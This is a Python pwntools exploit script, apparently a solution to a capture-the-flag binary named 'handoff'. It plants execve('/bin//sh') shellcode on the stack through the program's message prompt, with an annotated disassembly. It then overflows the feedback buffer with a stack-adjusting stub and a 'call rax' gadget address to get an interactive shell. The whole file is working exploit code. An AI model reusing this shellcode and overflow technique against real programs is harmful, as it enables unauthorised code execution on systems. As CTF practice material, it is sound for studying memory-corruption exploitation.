from pwn import *

context.arch = "amd64"
context.endian = "little"
context.word_size = 64
context.terminal = ["tmux", "splitw", "-h"]

p = process("./handoff")

g = cyclic_gen();

# shellcode \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
# means:
"""
0:  31 c0                   xor    eax,eax
2:  48 bb d1 9d 96 91 d0    movabs rbx,0xff978cd091969dd1
9:  8c 97 ff
c:  48 f7 db                neg    rbx
f:  53                      push   rbx
10: 54                      push   rsp
11: 5f                      pop    rdi
12: 99                      cdq
13: 52                      push   rdx
14: 57                      push   rdi
15: 54                      push   rsp
16: 5e                      pop    rsi
17: b0 3b                   mov    al,0x3b
19: 0f 05                   syscall 
"""

# Create user and place shellcode on the stack
data = p.recvuntil(b"3. Exit the app\n");
p.sendline(b"1");
data = p.recvuntil(b"recipient's name: \n");
payload = g.get(7);
p.sendline(payload);
data = p.recvuntil(b"3. Exit the app\n")
p.sendline(b"2");
data = p.recvuntil(b"to send a message to?\n")
payload = b"0"
p.sendline(payload)
data = p.recvuntil(b"you like to send them?\n")
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(63);
p.sendline(payload);
data = p.recvuntil(b"3. Exit the app\n")
p.sendline(b"3")
p.recvuntil(b"really appreciate it: \n")

# call rax gadget
addr = 0x0000000000401014

# the 8'th byte (index 7 in the array 'feedback[8]') gets zero'd but in this case it's fine 
# since the 8'th byte of the shellcode is still 0
shellcode = asm("""
nop
sub rsp, 0x2e0
mov rax, rsp
call rax
""").ljust(20, b"\x90" )

payload = shellcode + p64(addr)
p.sendline(payload)
p.interactive()
